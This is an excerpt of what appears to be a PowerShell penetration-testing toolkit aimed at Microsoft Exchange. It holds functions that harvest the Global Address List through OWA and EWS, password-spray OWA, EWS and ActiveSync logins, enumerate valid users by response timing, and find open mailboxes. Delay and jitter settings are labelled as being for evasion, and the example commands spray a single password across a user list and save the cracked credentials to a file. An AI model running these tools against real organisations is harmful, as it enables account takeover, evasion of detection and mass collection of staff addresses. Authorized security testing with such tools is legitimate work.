...
<#
  .SYNOPSIS
    ...
    This module will first attempt to connect to an Outlook Web Access portal and utilize the "FindPeople" method (only available in Exchange2013 and up) with automatic pagination of gathering email addresses from the Global Address List. If this does not succeed the script will attempt to connect to Exchange Web Services where it will attempt to gather the Global Address List using single or multi-threaded queries.
    ...
    .DESCRIPTION
        ...
        This module will first attempt to connect to an Outlook Web Access portal and utilize the "FindPeople" method (only available in Exchange2013 and up) with automatic pagination to gather email addresses from the Global Address List without crashing or server timeouts. If this does not succeed the script will attempt to connect to Exchange Web Services where it will attempt to gather the Global Address List.
    ...
    .PARAMETER Delay
        ...
        Base delay in seconds between consecutive requests/pages (Default: 0).

    .PARAMETER Jitter

        Jitter percentage (0-100) or additional random delay applied to the base delay for OPSEC/evasion (Default: 0).

    .PARAMETER Threads

        Number of concurrent threads/connections for EWS queries (Default: 1).

    .PARAMETER PageSize

        Number of entries requested per page in OWA FindPeople (Default: 250).


  .EXAMPLE

    C:\PS> Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016 -Threads 1 -Delay 2 -Jitter 20 -OutFile global-address-list.txt

    Description
    -----------
    This command will connect to the Exchange server at mail.domain.com and gather the GAL via paginated OWA or EWS with 1 connection at a time and a 2-second delay (+/- 20% jitter) between requests, writing results to global-address-list.txt.
...
'@
    ...
    try
    {
        ...
        Write-Output "[*] Now utilizing FindPeople with pagination to retrieve Global Address List..."
        $emailspre = @()
        if ($OutFile -ne "")
        {
        ...
        $offset = 0
        $pageSizeActual = if ($PageSize -gt 0) { $PageSize } else { 250 }
        $hasMore = $true
        $totalRetrieved = 0

        while ($hasMore)
        {
            # Apply Delay and Jitter between page requests
            if ($offset -gt 0 -and ($Delay -gt 0 -or $Jitter -gt 0))
            {
                if ($Delay -gt 0 -and $Jitter -gt 0)
                {
                    if ($Jitter -le 100) {
                        $minSleep = [math]::Max(0, [int]($Delay * (1.0 - ($Jitter / 100.0))))
                        $maxSleep = [int]($Delay * (1.0 + ($Jitter / 100.0)))
                    } else {
                        $minSleep = $Delay
                        $maxSleep = $Delay + $Jitter
                    }
                    if ($minSleep -eq $maxSleep) { $actualSleep = $minSleep }
                    else { $actualSleep = Get-Random -Minimum $minSleep -Maximum ($maxSleep + 1) }
                }
                elseif ($Delay -gt 0)
                {
                    $actualSleep = $Delay
                ...
                {
                    $actualSleep = Get-Random -Minimum 0 -Maximum ($Jitter + 1)
                }
                if ($actualSleep -gt 0)
                {
                    Write-Host -ForegroundColor "darkgray" "[*] Sleeping $actualSleep seconds before next page..."
                    Start-Sleep -Seconds $actualSleep
                }
            }

            $findPeopleBody = "{`"__type`":`"FindPeopleJsonRequest:#Exchange`",`"Header`":{`"__type`":`"JsonRequestHeaders:#Exchange`",`"RequestServerVersion`":`"Exchange2013`",`"TimeZoneContext`":{`"__type`":`"TimeZoneContext:#Exchange`",`"TimeZoneDefinition`":{`"__type`":`"TimeZoneDefinitionType:#Exchange`",`"Id`":`"Mountain Standard Time`"}}},`"Body`":{`"__type`":`"FindPeopleRequest:#Exchange`",`"IndexedPageItemView`":{`"__type`":`"IndexedPageView:#Exchange`",`"BasePoint`":`"Beginning`",`"Offset`":$offset,`"MaxEntriesReturned`":$pageSizeActual},`"QueryString`":null,`"ParentFolderId`":{`"__type`":`"TargetFolderId:#Exchange`",`"BaseFolderId`":{`"__type`":`"AddressListId:#Exchange`",`"Id`":`"$AddressListId`"}},`"PersonaShape`":{`"__type`":`"PersonaResponseShape:#Exchange`",`"BaseShape`":`"Default`"},`"ShouldResolveOneOffEmailAddress`":false}}"

            $pageRetry = 0
            $pageSuccess = $false
            $FindPeopleResults = $null

            while ($pageRetry -lt 3 -and -not $pageSuccess)
            {
                try
                {
                    $FindPeopleResults = Invoke-WebRequest -Uri $FindPeopleURL -Method POST -ContentType "application/json" -Body $findPeopleBody -Headers @{"X-OWA-CANARY"="$CanaryCookie";"Action"="FindPeople"} -WebSession $owasession -TimeoutSec 60
                    $pageSuccess = $true
                }
                catch
                {
                    ...
                    Write-Host -ForegroundColor "yellow" "[!] FindPeople request for offset $offset failed (Attempt $pageRetry of 3): $err"
                    if ($pageRetry -lt 3)
                    {
            ...
            if (-not $pageSuccess)
            {
                Write-Host -ForegroundColor "red" "[-] Could not fetch page at offset $offset after 3 attempts."
                if ($totalRetrieved -eq 0)
                {
                    throw "FindPeople initial page failed"
                }
                else
                {
                    break
            ...
            if ($FPPreArray.Count -gt 1)
            {
                for ($i = 1; $i -lt $FPPreArray.Count; $i++)
                {
                    $entry = $FPPreArray[$i]
                    if ($entry -ne "")
                    {
                        $split3 = $entry -split '","RoutingType"', 0, "simplematch"
                        $emailAddress = $split3[0]
                        if ($emailAddress -and $emailAddress -like "*@*")
                        {
                            $pageResults += $emailAddress
                        }
                    }
                }
            }
            ...
            {
                foreach ($addr in $pageResults)
                {
                    Write-Output $addr
                    $emailspre += $addr
                    if ($OutFile -ne "")
                    {
                        $addr | Out-File -Append -Encoding ascii $OutFile
                    }
                }
                $totalRetrieved += $pageResults.Count
                Write-Host -ForegroundColor "green" "[+] Page complete: retrieved $($pageResults.Count) addresses (Total: $totalRetrieved, Offset: $offset)"
                $offset += $pageResults.Count

                if ($pageResults.Count -lt $pageSizeActual)
                {
                    $hasMore = $false
                }
            }
        ...
        Write-Output "[*] Now cleaning up and deduplicating the list..."
        $GlobalAddressList = $emailspre | Sort-Object -Unique
        Write-Host -ForegroundColor "green" ("[*] A total of " + $GlobalAddressList.count + " unique email addresses were retrieved")
    ...
    {
        Write-Host -ForegroundColor "yellow" "`r`n[*] FindPeople method failed or was unavailable. Trying Exchange Web Services..."
        #Running the LoadEWSDLL function to load the required Exchange Web Services dll
        LoadEWSDLL

        Write-Output "[*] Trying Exchange version $ExchangeVersion"
        $numThreads = [int]$Threads
        if ($numThreads -lt 1) { $numThreads = 1 }
        ...
        #Clear or create output file if specified so progressive results can be written
        if ($OutFile -ne "")
        {
            New-Item -Path $OutFile -ItemType File -Force | Out-Null
        }

        Write-Output "[*] Attempting to gather Global Address List via EWS (Threads: $numThreads, Combos: $($lettercombinations.Count))..."

        $GlobalAddressList = @()

        if ($numThreads -eq 1)
        {
            # Single-threaded mode with resilient connection loop
            $ServiceExchangeVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
            $service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ServiceExchangeVersion)
            ...
            if ($ExchHostname -ne "")
            {
                $service.Url = new-object System.Uri(("https://" + $ExchHostname + "/EWS/Exchange.asmx"))
                try {
                    $sp = [System.Net.ServicePointManager]::FindServicePoint($service.Url)
            ...
            foreach($combo in $lettercombinations)
            {
                if ($Delay -gt 0 -or $Jitter -gt 0)
                {
                    ...
                    if ($actualSleep -gt 0)
                    {
                        Write-Host -ForegroundColor "darkgray" "[*] Sleeping $actualSleep seconds before resolving '$combo'..."
                        Start-Sleep -Seconds $actualSleep
                    }
                }
                ...
                while ($retryCount -lt $maxRetries)
                {
                    ...
                    catch
                    {
                        $retryCount++
                        $ErrorMessage = $_.Exception.Message
                        Write-Host -ForegroundColor "yellow" "[!] ResolveName warning for '$combo' (Attempt $retryCount of $maxRetries): $ErrorMessage"
                ...
                if ($galresults -ne $null)
                {
                    foreach($item in $galresults)
                    {
                        if ($item.Mailbox -and $item.Mailbox.Address)
                        {
                            Write-Output $item.Mailbox.Address
                            $GlobalAddressList += $item.Mailbox.Address
                            if ($OutFile -ne "")
                            {
                                $item.Mailbox.Address | Out-File -Append -Encoding ascii $OutFile
                            }
                        }
                    }
                }
        ...
        {
            # Multi-threaded mode using background jobs
            $combolists = @{}
            $count = 0
            $lettercombinations | ForEach-Object {
                $combolists[$count % $numThreads] += @($_)
                $count++
            }
            ...
            0..($numThreads-1) | ForEach-Object {
                Start-Job -ScriptBlock {
                    $UncompressedBytes = $args[0]
                    $combos = $args[1]
                    $UserName = $args[2]
                    $Password = $args[3]
                    ...
                    $asm = [Reflection.Assembly]::Load($UncompressedBytes)
...
'@
                ...
                } -ArgumentList $UncompressedFileBytes, $combolists[$_], $UserName, $Password, $ExchangeVersion, $ExchHostname, $Delay, $Jitter | Out-Null
            }

            # Monitoring loop for background jobs
            while (Get-Job -State Running)
            {
                $jobOutputs = Receive-Job -Job (Get-Job)
                if ($jobOutputs)
                {
                    foreach ($line in $jobOutputs)
                    {
                        if ($line -and $line -like "*@*")
                        {
                            Write-Output $line
                            $GlobalAddressList += $line
                            if ($OutFile -ne "")
                            {
            ...
            # Drain any remaining job outputs
            $jobOutputs = Receive-Job -Job (Get-Job)
            if ($jobOutputs)
            {
                foreach ($line in $jobOutputs)
        ...
        Write-Output "[*] Now cleaning up and deduplicating the list..."
        $GlobalAddressList = $GlobalAddressList | Sort-Object -Unique
        Write-Output ("A total of " + $GlobalAddressList.count + " unique email addresses were retrieved")
        If ($OutFile -ne "")
        {
            $GlobalAddressList | Out-File -Encoding ascii $OutFile
            Write-Output "[*] Final unique email addresses written to $OutFile"
        }
    }
}
...
<#
  .SYNOPSIS
    ...
    .PARAMETER Delay
        ...
        Base delay in seconds between consecutive password spray attempts per thread (Default: 0).
  ...
  .EXAMPLE
    ...
    C:\PS> Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 1 -Delay 5 -Jitter 30 -OutFile owa-sprayed-creds.txt

    Description
    -----------
    This command will connect to the Outlook Web Access server at https://mail.domain.com/owa/ and attempt to password spray a list of usernames with a single password using 1 thread (1 connection at a time) with a 5-second delay (+/- 30% jitter) between attempts, outputting results to owa-sprayed-creds.txt.
...
'@
    ...
    ForEach($Username in $args[0])
    {
        if ($Delay -gt 0 -or $Jitter -gt 0)
        {
            ...
            if ($actualSleep -gt 0)
            {
                Write-Host -ForegroundColor "darkgray" "[*] Sleeping $actualSleep seconds before trying '$Username'..."
                Start-Sleep -Seconds $actualSleep
            }
        }
    ...
    } -ArgumentList $userlists[$_], $Password, $OWAURL2, $OWAURL, $Domain, $Delay, $Jitter | Out-Null
...
<#
  ...
  .EXAMPLE
    ...
    C:\PS> Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 1 -Delay 5 -Jitter 30 -OutFile sprayed-ews-creds.txt

    Description
    -----------
    This command will connect to the Exchange Web Services server at https://mail.domain.com/EWS/Exchange.asmx and attempt to password spray a list of usernames with a single password using 1 thread (1 connection at a time) with a 5-second delay (+/- 30% jitter) between attempts, outputting results to sprayed-ews-creds.txt.
...
'@
    ...
    ## end code from http://poshcode.org/624
		    ...
		    if ($ErrorMessage -like "*SMTP*" -or $ErrorMessage -like "*no mailbox*")
                    {
        ...
        } -ArgumentList $userlists[$_], $userPassword, $ExchHostname, $Mailbox, $ExchangeVersion, $Password, $UncompressedFileBytes, $Domain, $Delay, $Jitter | Out-Null
...
'@
    ...
    ForEach($Username in $Users)
    {
		...
		if ($TimeTaken -le $Thresh)
        {
            ...
            if ($OutFile -ne "")
            {
                $CurrUser | Out-File -Append -Encoding ascii $OutFile
            }
        }
    }
    ...
    if ($OutFile -ne "")
       {
            $fullresults = $fullresults | Sort-Object -Unique
            $fullresults | Out-File -Encoding ascii $OutFile
            Write-Host "Results have been written to $OutFile."
       }
}
...
#>
  ...
  # Configure ServicePointManager to prevent stale keep-alive connection drops
  [System.Net.ServicePointManager]::DefaultConnectionLimit = 100
  [System.Net.ServicePointManager]::MaxServicePointIdleTime = 5000
  [System.Net.ServicePointManager]::Expect100Continue = $false
  try {
  ...
  else
  {
    ...
    foreach($mbx in $Mailboxes)
    {
        if ($Delay -gt 0 -or $Jitter -gt 0)
        {
            ...
            if ($actualSleep -gt 0)
            {
                Write-Host -ForegroundColor "darkgray" "[*] Sleeping $actualSleep seconds before checking '$mbx'..."
                Start-Sleep -Seconds $actualSleep
            }
        }
        ...
        try
        {
            ...
            if ($OutFile -ne "")
            {
                $mbx | Out-File -Append -Encoding ascii $OutFile
            }
        }
        catch
        {
    ...
    if ($OutFile -ne "")
    {
      $OpenMailboxes = $OpenMailboxes | Sort-Object -Unique
  ...
  else
  {
    ...
    foreach($EmailAddress in $Emails)
    {
        if ($Delay -gt 0 -or $Jitter -gt 0)
        {
            ...
            if ($actualSleep -gt 0)
            {
                Write-Host -ForegroundColor "darkgray" "[*] Sleeping $actualSleep seconds before querying '$EmailAddress'..."
                Start-Sleep -Seconds $actualSleep
            }
        }
        ...
        while ($retryCount -lt $maxRetries)
        {
            try
            {
                $ncCol = $service.ResolveName($EmailAddress,$null,[Microsoft.Exchange.WebServices.Data.ResolveNameSearchLocation]::DirectoryOnly,$true,$cnpsPropset)
                break
            }
            catch
            {
                $retryCount++
                $ErrorMessage = $_.Exception.Message
                Write-Host -ForegroundColor "yellow" "[!] ResolveName warning for '$EmailAddress' (Attempt $retryCount of $maxRetries): $ErrorMessage"
                if ($retryCount -lt $maxRetries)
                {
                    Start-Sleep -Seconds 2
                    try
	    ...
	    if($ncCol -ne $null)
        {
		    foreach($Result in $ncCol)
            {
                if(($Result.Mailbox.Address.ToLower() -eq $EmailAddress.ToLower()) -bor $Partial.IsPresent -bor $AliasOnly.IsPresent )
                {
                    ...
                    if ($OutFile -ne "")
                    {
                        $Alias | Out-File -Append -Encoding ascii $OutFile
                    }
                }
...
<#
  .SYNOPSIS
    ...
    .PARAMETER Delay
        Delay in seconds between spraying attempts. Default is 0.

    .PARAMETER Jitter
        Jitter percentage (0-100) or extra jitter seconds to randomize the delay. Default is 0.

  .EXAMPLE
    C:\PS> Invoke-PasswordSprayEAS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 1 -Delay 5 -Jitter 20 -OutFile owa-sprayed-creds.txt
    Description
    -----------
    This command will connect to EAS at https://mail.domain.com/owa/ and attempt to password spray a list of usernames with a single password over 1 thread with 5 second delay and 20% jitter and write to a file called owa-sprayed-creds.txt.
#>
  Param(
    [Parameter(Position = 0, Mandatory = $false)]
    [system.URI]
...
'@
    ...
    }  -ArgumentList $userlists[$_], $Password, $EASURL, $Domain, $Delay, $Jitter | Out-Null
